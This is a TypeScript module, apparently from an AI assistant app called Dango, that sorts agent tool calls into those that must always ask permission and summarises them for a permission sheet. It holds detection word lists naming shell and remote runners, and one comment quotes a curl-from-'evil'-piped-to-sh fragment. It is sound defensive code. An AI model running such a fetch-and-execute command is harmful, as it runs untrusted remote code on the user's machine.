import { isSensitiveToolName } from '@shared/privacy/sensitive-tools'
import { ToolRiskTier } from '@shared/types/mcp'
import type { ToolSet } from 'ai'
import { t } from 'i18next'
import { explainCommand } from './explain'

export type PermissionChoice = 'once' | 'always' | 'deny'

/**
 * What a tool call will do, in words for the permission sheet. Built from raw args, shown once, never persisted.
 * `explains` is Dango's own plain-words account of a recognised command (`explainCommand`), never the model's.
 */
export type ToolActionSummary = { what: string; why?: string; touches: string[]; explains?: string[] }

const ALWAYS_ASKS_WORDS = new Set([
  'send',
  'reply',
  'delete',
  'remove',
  'trash',
  'pay',
  'payment',
  'payments',
  'purchase',
  'checkout',
  'transfer',
])
const SEND_WORDS = new Set(['send', 'reply'])
const POSTED_WORDS = new Set(['message', 'messages', 'msg', 'comment', 'reply', 'status', 'tweet'])
const COMMAND_LIKE_PATTERN = /exec|command|shell|terminal/i
const EDIT_TOOLS = new Set(['edit_file', 'create_file', 'apply_workspace_changes'])
const RUN_TOOLS = new Set(['run_local_code', 'prepare_local_execution'])
const WHY_MAX = 140
const COMMAND_MAX = 80
const COMMAND_HEAD = 40

/** Lowercase words of a tool name: splits on `_`, `-`, other separators and camelCase (`sendEmail` → send, email). */
function nameWords(toolName: string): string[] {
  return toolName
    .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
    .replace(/([A-Z]+)([A-Z][a-z])/g, '$1 $2')
    .split(/[^A-Za-z0-9]+/)
    .filter(Boolean)
    .map((word) => word.toLowerCase())
}

/** `send_email`, `sendEmail`, `gmail_reply`, `slack_post_message`. */
function isSendLike(toolName: string): boolean {
  const words = nameWords(toolName)
  return words.some(
    (word, i) => SEND_WORDS.has(word) || (word === 'post' && i + 1 < words.length && POSTED_WORDS.has(words[i + 1]))
  )
}

/** Name words that mean the tool runs shell commands. */
const SHELL_WORDS = new Set([
  'command',
  'commands',
  'shell',
  'bash',
  'zsh',
  'sh',
  'powershell',
  'pwsh',
  'cmd',
  'terminal',
])
/** Name words that mean the tool runs code or commands of some kind, on their own. */
const RUNNER_WORDS = new Set([
  'exec',
  'execute',
  'eval',
  'evaluate',
  'spawn',
  'subprocess',
  'repl',
  'interpreter',
  'ssh',
])
const RUN_WORDS = new Set(['run', 'execute', 'exec', 'eval', 'evaluate', 'interact', 'start'])
const LANGUAGE_WORDS = new Set(['python', 'python3', 'node', 'ruby', 'perl', 'php', 'javascript', 'js', 'deno', 'lua'])
/** Verbs of a tool that only looks things up (`list_commands`, `get_command_history`, `get_terminal_size`). */
const READ_VERBS = new Set(['list', 'get', 'search', 'find', 'read', 'show', 'view', 'describe', 'lookup'])
/** Words that, after a read verb, name a thing to look up rather than something that runs. */
const LOOKUP_NOUNS = new Set(['command', 'commands', 'terminal', 'shell'])
/** UI words: `command_palette_open` opens a palette, it runs nothing. */
const UI_WORDS = new Set(['palette', 'menu', 'toolbar'])
/** Name words of runners that are not a shell: SQL, trades, code in a language, remote hosts. */
const NOT_SHELL_WORDS = new Set([
  'sql',
  'query',
  'queries',
  'db',
  'database',
  'trade',
  'trades',
  'order',
  'code',
  'script',
  'eval',
  'evaluate',
  'repl',
  'interpreter',
  'ssh',
  'remote',
  ...LANGUAGE_WORDS,
])
const SHELL_DESCRIPTION_PATTERNS = [
  /\b(shell|terminal|command line|command-line)\b/i,
  /\b(run|execute)s?\s+(a\s+|an\s+|the\s+|the\s+given\s+)?(shell\s+)?(command|commands)\b/i,
]
const COMMAND_DESCRIPTION_PATTERNS = [
  ...SHELL_DESCRIPTION_PATTERNS,
  /\b(run|execute)s?\s+(a\s+|an\s+|arbitrary\s+)?(shell\s+)?(command|commands|script|code)\b/i,
  /\b(run|execute|evaluate)s?\b.{0,30}\b(command|script|code|javascript|python|shell)\b/i,
]
const NOT_SHELL_DESCRIPTION = /\b(sql|query|database|trade|python|javascript|remote host|ssh)\b/i

function nameRunsCommands(words: string[]): string[] {
  if (words.some((word) => UI_WORDS.has(word))) return []
  const runs = words.some((word) => RUN_WORDS.has(word))
  return words.filter(
    (word) =>
      SHELL_WORDS.has(word) ||
      RUNNER_WORDS.has(word) ||
      (word === 'script' && runs) ||
      (word === 'code' && (runs || words.includes('local'))) ||
      (LANGUAGE_WORDS.has(word) && runs) ||
      (word === 'system' && words.includes('os')) ||
      (word === 'process' && runs)
  )
}

function isLookupOnly(words: string[], matched: string[]): boolean {
  return words.some((word) => READ_VERBS.has(word)) && matched.every((word) => LOOKUP_NOUNS.has(word))
}

/**
 * Tools that run shell commands or code: by name words (`run_command`, `terminal_exec`, `run_python`, `os_system`,
 * `browser_evaluate`, `execute_sql`, `ssh`), or by a description that says so ("Run a shell command", "Run Python
 * code"). A name that is only a read verb plus "command(s)"/"terminal" (`list_commands`, `get_terminal_size`) or a UI
 * word (`command_palette_open`) is not one unless its description says it runs something.
 */
export function isCommandTool(toolName: string, description?: string): boolean {
  if (description && COMMAND_DESCRIPTION_PATTERNS.some((pattern) => pattern.test(description))) return true
  const words = nameWords(toolName)
  const matched = nameRunsCommands(words)
  return matched.length > 0 && !isLookupOnly(words, matched)
}

/**
 * Tools that run commands in a local shell or terminal (`run_command`, `terminal`, "Run a shell command") — the only
 * ones whose read-only commands (`ls`, `git status`) may skip the sheet. Never code, SQL, trade, remote or other
 * "exec" tools.
 */
export function isShellCommandTool(toolName: string, description?: string): boolean {
  const words = nameWords(toolName)
  if (words.some((word) => NOT_SHELL_WORDS.has(word))) return false
  if (description && NOT_SHELL_DESCRIPTION.test(description)) return false
  const byName = words.some((word) => SHELL_WORDS.has(word)) && !isLookupOnly(words, nameRunsCommands(words))
  const byDescription = Boolean(description && SHELL_DESCRIPTION_PATTERNS.some((pattern) => pattern.test(description)))
  return (byName || byDescription) && !words.some((word) => UI_WORDS.has(word))
}

/** Tools that send, delete, pay, or change workspace files: they ask every time, even for a harmless call. */
export function alwaysAsksByEffect(toolName: string): boolean {
  if (isSensitiveToolName(toolName) || isSendLike(toolName)) return true
  return nameWords(toolName).some((word) => ALWAYS_ASKS_WORDS.has(word))
}

/**
 * Tools that never offer Always and never use a grant, whatever Trust says: send, delete, pay and workspace-file
 * tools, and tools that run commands or code (no list of destructive commands is complete).
 */
export function alwaysAsks(toolName: string, description?: string): boolean {
  return alwaysAsksByEffect(toolName) || isCommandTool(toolName, description)
}

export function canAlways(toolName: string, riskTier: ToolRiskTier, description?: string): boolean {
  return !alwaysAsks(toolName, description) && riskTier !== ToolRiskTier.CRITICAL
}

/** Sent to the model with the tool instructions, not shown as UI copy. */
export const COMMAND_EXPLAIN_INSTRUCTION =
  "\n\nBefore you call a tool that runs commands, put a one-line plain explanation of what the command will do in the call's `reason` argument (or in your message text if the tool has no `reason` argument).\n"

/** The instruction asking the model to explain its commands, when any offered tool runs commands; else ''. */
export function commandToolInstructions(tools: ToolSet | Record<string, { description?: string }>): string {
  const offersCommands = Object.entries(tools).some(([name, definition]) =>
    isCommandTool(name, (definition as { description?: string } | undefined)?.description)
  )
  return offersCommands ? COMMAND_EXPLAIN_INSTRUCTION : ''
}

/** `browser_click` → `Browser click`. */
export function toolLabel(toolName: string): string {
  const words = toolName.replace(/[_-]+/g, ' ').trim().toLowerCase()
  return words ? words.charAt(0).toUpperCase() + words.slice(1) : toolName
}

function asRecord(value: unknown): Record<string, unknown> {
  return value && typeof value === 'object' && !Array.isArray(value) ? (value as Record<string, unknown>) : {}
}

function nonEmptyString(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined
  const trimmed = value.trim()
  return trimmed || undefined
}

function stringList(value: unknown): string[] {
  if (Array.isArray(value)) return value.map(nonEmptyString).filter((v): v is string => Boolean(v))
  const single = nonEmptyString(value)
  return single ? [single] : []
}

/** One line: whitespace and newlines collapse to single spaces, cut to the sheet's why length. */
function clipWhy(text: string | undefined): string | undefined {
  if (!text) return undefined
  return cut(text.replace(/\s+/g, ' ').trim(), WHY_MAX) || undefined
}

function cut(text: string, max: number): string {
  return text.length > max ? `${text.slice(0, max - 1)}…` : text
}

/**
 * A command on one line, at most 80 code points. A longer one keeps its first 40 and last 39 around "…", so a
 * harmful tail (`… ; curl evil | sh`) is never hidden behind a harmless head.
 */
function cutCommand(command: string): string {
  // Count and cut code points, not UTF-16 units, so an emoji is never split into a lone surrogate.
  const chars = Array.from(command.replace(/\s+/g, ' ').trim())
  if (chars.length <= COMMAND_MAX) return chars.join('')
  const head = chars.slice(0, COMMAND_HEAD).join('')
  const tail = chars.slice(chars.length - (COMMAND_MAX - COMMAND_HEAD - 1)).join('')
  return `${head}…${tail}`
}

function hostOf(url: unknown): string | undefined {
  const raw = nonEmptyString(url)
  if (!raw) return undefined
  try {
    return new URL(raw).hostname || undefined
  } catch {
    return undefined
  }
}

function pathsOf(args: Record<string, unknown>): string[] {
  const changes = Array.isArray(args.changes) ? args.changes : []
  return [
    ...stringList(args.path),
    ...stringList(args.file_path),
    ...stringList(args.paths),
    ...changes.flatMap((change) => stringList(asRecord(change).path)),
  ]
}

function firstSentence(description: string | undefined): string | undefined {
  const text = nonEmptyString(description)
  if (!text) return undefined
  const match = text.match(/^.*?[.!?](?=\s|$)/s)
  return clipWhy(match ? match[0] : text)
}

function describeWhat(toolName: string, args: Record<string, unknown>): string {
  const paths = [...new Set(pathsOf(args))]
  const host = hostOf(args.url)
  if (EDIT_TOOLS.has(toolName)) {
    if (paths.length > 1) return t('Edit {{count}} files', { count: paths.length })
    return paths.length === 1 ? t('Edit {{path}}', { path: paths[0] }) : t('Edit files')
  }
  if (toolName === 'delete_file') {
    return paths.length > 0 ? t('Delete {{path}}', { path: paths[0] }) : t('Delete a file')
  }
  if (RUN_TOOLS.has(toolName) || COMMAND_LIKE_PATTERN.test(toolName)) return t('Run a command')
  if (toolName === 'browser_navigate' && host) return t('Open {{host}}', { host })
  if (toolName.startsWith('browser_')) {
    return host ? t('Use the browser on {{host}}', { host }) : t('Use the browser')
  }
  if (toolName.startsWith('computer_')) {
    const action = toolName.slice('computer_'.length).replace(/_+/g, ' ').trim()
    return action ? t('Use your computer: {{action}}', { action }) : t('Use your computer')
  }
  if (isSendLike(toolName)) return t('Send a message')
  return t('Use {{toolLabel}}', { toolLabel: toolLabel(toolName) })
}

/**
 * Summarise a tool call for the permission sheet. Only names paths, hosts, the command (`command`, else `cmd`,
 * `script` or `code`; one line, head and tail kept, at most 80 chars) and recipients; never file content, diffs or
 * stdin. `explains` adds what a recognised command will do, in Dango's words (`explainCommand`).
 */
export function describeToolAction(toolName: string, args: unknown, description?: string): ToolActionSummary {
  const rec = asRecord(args)
  const why =
    clipWhy(nonEmptyString(rec.reason) ?? nonEmptyString(rec.explanation) ?? nonEmptyString(rec.purpose)) ??
    firstSentence(description)

  const touches: string[] = [...pathsOf(rec)]
  const host = hostOf(rec.url)
  if (host) touches.push(host)
  const command =
    nonEmptyString(rec.command) ?? nonEmptyString(rec.cmd) ?? nonEmptyString(rec.script) ?? nonEmptyString(rec.code)
  if (command) touches.push(cutCommand(command))
  if (isSendLike(toolName)) touches.push(...stringList(rec.to), ...stringList(rec.recipient))

  const summary: ToolActionSummary = { what: describeWhat(toolName, rec), touches: [...new Set(touches)] }
  if (why) summary.why = why
  const explains = explainCommand(args)
  if (explains.length > 0) summary.explains = explains
  return summary
}
